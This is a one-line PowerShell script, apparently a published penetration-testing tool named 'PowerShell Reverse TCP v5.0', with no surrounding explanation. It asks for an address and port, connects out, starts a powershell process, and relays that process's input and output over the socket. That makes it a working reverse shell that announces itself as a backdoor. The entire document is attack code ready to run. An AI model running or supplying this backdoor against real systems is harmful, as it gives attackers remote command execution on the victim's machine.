$a = $(Read-Host -Prompt "Enter address").Trim(); if (-not $a) { Write-Host "Address is required"; exit 1; } $p = $(Read-Host -Prompt "Enter port number").Trim(); if (-not $p) { Write-Host "Port number is required"; exit 1; } Write-Host "PowerShell Reverse TCP v5.0 by Ivan Sincek."; Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp."; try { $c = New-Object Net.Sockets.TcpClient($a, $p); $s = $c.GetStream(); $proc = New-Object Diagnostics.Process; $proc.StartInfo.FileName = "powershell"; $proc.StartInfo.UseShellExecute = $false; $proc.StartInfo.RedirectStandardInput = $true; $proc.StartInfo.RedirectStandardOutput = $true; $proc.StartInfo.RedirectStandardError = $true; [void]$proc.Start(); Write-Host "Backdoor is up and running..."; if (!$proc.HasExited) { $by = [Text.Encoding]::UTF8.GetBytes("SOCKET: Shell has connected! PID: $($process.Id)`n"); $s.Write($by, 0, $by.Length); $t = @( $s.CopyToAsync($proc.StandardInput.BaseStream, 1024); $proc.StandardOutput.BaseStream.CopyToAsync($s, 1024); $proc.StandardError.BaseStream.CopyToAsync($s, 1024); ); [void][Threading.Tasks.Task]::WaitAny($t); } Write-Host "Backdoor will now exit..."; } catch { Write-Host "ERROR: $($_.Exception.Message)"; } finally { if ($proc) { $proc.Close(); $proc.Dispose(); Clear-Variable "proc"; } if ($s) { $s.Close(); $s.Dispose(); Clear-Variable "s"; } if ($c) { $c.Close(); $c.Dispose(); Clear-Variable "c"; } [GC]::Collect(); } Clear-Variable "a"; Clear-Variable "p";
